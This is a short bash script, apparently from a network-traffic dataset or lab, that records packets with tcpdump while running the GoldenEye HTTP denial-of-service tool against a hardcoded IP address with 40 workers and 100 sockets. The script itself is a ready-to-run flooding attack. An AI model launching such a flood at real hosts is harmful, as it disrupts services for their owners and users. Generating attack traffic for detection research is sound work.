#!/bin/bash

TARGET="http://205.174.165.68"
INTERFACE="ens3"
PCAP_FILE="pcap/ddos_goldeneye_$(date +%Y%m%d_%H%M%S).pcap"

echo "Starting tcpdump capture: $PCAP_FILE"
sudo tcpdump -i "$INTERFACE" dst 205.174.165.68 -w "$PCAP_FILE" &
TCPDUMP_PID=$!

python3 GoldenEye/goldeneye.py "$TARGET" -w 40 -s 100

kill "$TCPDUMP_PID"
echo "DDoS simulation complete. PCAP saved to $PCAP_FILE"
